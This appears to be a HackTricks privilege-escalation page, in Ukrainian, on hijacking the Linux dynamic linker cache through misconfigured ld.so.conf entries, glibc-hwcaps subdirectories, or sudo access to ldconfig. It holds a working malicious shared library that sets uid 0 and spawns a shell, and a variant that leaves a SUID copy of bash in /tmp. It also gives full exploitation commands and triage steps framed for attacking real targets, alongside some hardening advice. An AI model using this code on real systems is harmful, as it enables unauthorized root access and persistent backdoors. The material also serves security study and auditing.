# приклад експлуатації прівілеїв через ld.so

{{#include ../../banners/hacktricks-training.md}}

Ця сторінка присвячена лабораторній роботі з отруєння **кешу системного лінкера через `/etc/ld.so.conf` або `ldconfig`**. Для ін’єкції відсутньої бібліотеки, записуваних `RPATH`/`RUNPATH`, `LD_PRELOAD` та інших загальних способів зловживання SUID-лінкером дивіться [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).

## Підготовка середовища

У наступному розділі наведено код файлів, які ми використаємо для підготовки середовища.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Створіть** ці файли на своїй машині в тій самій папці
2. **Скомпілюйте** **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Скопіюйте** `libcustom.so` до `/usr/lib` і оновіть кеш: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (потрібні **root privs**)
4. **Скомпілюйте** **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Перевірте середовище

Переконайтеся, що _libcustom.so_ **завантажується** з _/usr/lib_ і що ви можете **виконати** binary.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Корисні команди для triage

Під час атаки на реальну ціль перевірте **точну назву бібліотеки**, яка потрібна бінарному файлу, що **зараз визначає loader**, і які налаштовані шляхи доступні для запису без зміни активного кешу.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Використовуйте `ldd` лише для **trusted** executable. Деякі реалізації або незвичні ELF interpreters можуть спричинити виконання code, контрольованого attacker; `objdump -p ./file | grep NEEDED` безпечно виводить список прямих dependencies. Для trusted target виклик виявленого interpreter з `--list` показує фактичний resolution.<sup>[[4]](#references)</sup>

Кілька корисних нюансів:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` зазвичай **не працює**, оскільки
перенаправлення виконується вашим поточним shell. Замість цього використовуйте
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- **SUID/privileged** binaries працюють у **secure-execution mode**: `LD_LIBRARY_PATH`
ігнорується, тоді як `LD_PRELOAD` обмежується (імена, що містять slash,
ігноруються, а попередньо завантажуватися можуть лише libraries із позначкою setuid у стандартних directories). Після того як root запустить `ldconfig`, directories, зазначені в
`/etc/ld.so.conf`, можуть потрапити до `/etc/ld.so.cache`, тому ця misconfiguration
усе ще може впливати на privileged programs.<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG` також ігнорується в secure-execution mode, якщо не існує `/etc/suid-debug`, тому збирайте його trace під час еквівалентного non-SUID run, а не очікуйте output від privileged execution.<sup>[[1]](#references)</sup>
- У glibc 2.33 і новіших версіях dynamic loader також надає
`--list-diagnostics`, який виводить machine-readable loader diagnostics та
вбудовану інформацію про search paths, якщо hijack поводиться неочікувано.<sup>[[1]](#references)[[6]](#references)</sup>

### Обмеження cache та SONAME

`ldconfig` не кешує кожен довільний file у configured directory: він аналізує ELF headers, розпізнає імена, що відповідають `lib*.so*` або `ld-*.so*`, і очікує conventional chain `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. Тому injected object повинен мати цільову architecture/class, точне ім’я `DT_NEEDED` (зазвичай його `DT_SONAME`), а також усі symbols/versions, які victim resolves.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Віддавайте перевагу library, специфічній для цілі, як у цьому прикладі. Перекриття поширеного SONAME неповним об'єктом може порушити роботу кожного процесу, який знаходить його до запуску призначеної привілейованої цілі.<sup>[[3]](#references)</sup>

## Exploit

У цьому сценарії припустімо, що адміністратор додав вразливий запис до
файлу в `/etc/ld.so.conf.d/`, який підключається системним
`/etc/ld.so.conf`.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Вразлива папка — _/home/ubuntu/lib_ (де ми маємо доступ на запис).\
**Завантажте та скомпілюйте** наведений нижче код у цьому шляху:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Якщо ви очікуєте, що **root** (або інший привілейований обліковий запис) пізніше запустить вразливий бінарний файл, зазвичай краще залишити **root-owned artifact**, а не запускати інтерактивну оболонку. Наприклад:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Після виконання привілейованої операції ви можете використати `/tmp/rootbash -p`.

Тепер, коли ми **створили шкідливу бібліотеку libcustom у неправильно налаштованому** шляху, кеш за замовчуванням має бути перебудований після успішного привілейованого запуску **`ldconfig`**. Перезавантаження допомагає лише в тих випадках, коли локальний процес завантаження справді викликає цю команду; в іншому разі дочекайтеся дії адміністратора або скористайтеся небезпечним правилом sudo, якщо воно доступне.<sup>[[2]](#references)</sup>

Після цього **повторно перевірте**, звідки виконуваний файл `sharedvuln` завантажує бібліотеку `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Як бачите, він **завантажує його з `/home/ubuntu/lib`**, і якщо будь-який користувач його виконає, буде запущено shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Зверніть увагу, що в цьому прикладі ми не підвищили привілеї, але, змінивши виконувані команди та **дочекавшись, поки root або інший привілейований користувач виконає вразливий бінарний файл**, ми зможемо підвищити привілеї.

### Затінення `glibc-hwcaps` у сучасних системах

Починаючи з glibc 2.33, loader може надавати перевагу оптимізованим бібліотекам у `glibc-hwcaps/<level>/` усередині **кожного каталогу пошуку бібліотек**. Отже, перевірки лише `/home/ubuntu/lib` недостатньо: доступний для запису сумісний підкаталог, наприклад `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`, може затінити базову бібліотеку після того, як `ldconfig` проіндексує його, тоді як інші CPU продовжать використовувати базовий об'єкт. Це також створює перехоплення, вибіркове за архітектурою, яке можна пропустити, якщо перевірка виконується на іншому CPU.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Поточні рекомендації щодо hardening glibc радять уникати дублікатів SONAMEs, нестандартних шляхів пошуку та об'єктів у підкаталогах `glibc-hwcaps`. З точки зору аудиту рекурсивно перевіряйте власника та можливість запису для налаштованих каталогів і всіх компонентів їхніх батьківських шляхів.<sup>[[3]](#references)</sup>

### Інші неправильні конфігурації - Та сама вразливість

У попередньому прикладі ми імітували неправильну конфігурацію, у якій адміністратор **вказав непривілейовану папку у файлі конфігурації всередині `/etc/ld.so.conf.d/`**.\
Але існують й інші неправильні конфігурації, які можуть спричинити ту саму вразливість: якщо ви маєте **права на запис** до завантаженого **файлу конфігурації**, можете створити файл у доступному для запису каталозі `/etc/ld.so.conf.d/` або можете записувати до `/etc/ld.so.conf`, ви можете налаштувати та експлуатувати ту саму вразливість.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**Припустімо, що ви маєте привілеї sudo для `ldconfig`**.\
За допомогою `-f` можна вказати `ldconfig` **файл конфігурації, який потрібно прочитати**, тому файл, що містить каталоги під контролем атакувальника, може змусити `ldconfig` додати ці папки до кешу.<sup>[[2]](#references)</sup>\
Отже, створімо файли та папки, необхідні для завантаження "/tmp":
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Тепер, як зазначено в **попередньому exploit**, **створіть malicious library у `/tmp`**.\
І нарешті, завантажимо шлях і перевіримо, звідки binary завантажує library:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Як бачите, маючи sudo-привілеї для запуску `ldconfig`, можна експлуатувати ту саму вразливість.** Деталі параметрів мають значення під час оцінювання обмеженого правила sudo: `-f` вибирає іншу конфігурацію, але все одно перебудовує `/etc/ld.so.cache`; `-C` перенаправляє кеш в інше місце; `-N` запобігає перебудові кешу; а `-X` запобігає оновленню посилань, але **все одно перебудовує кеш, якщо не використовується разом із `-N`**.<sup>[[2]](#references)</sup>



## References

- [1] [ld.so(8) - Сторінка посібника Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Сторінка посібника Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Зміцнення Dynamic Linker - The GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Сторінка посібника Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Діагностика Dynamic Linker (The GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
{{#include ../../banners/hacktricks-training.md}}
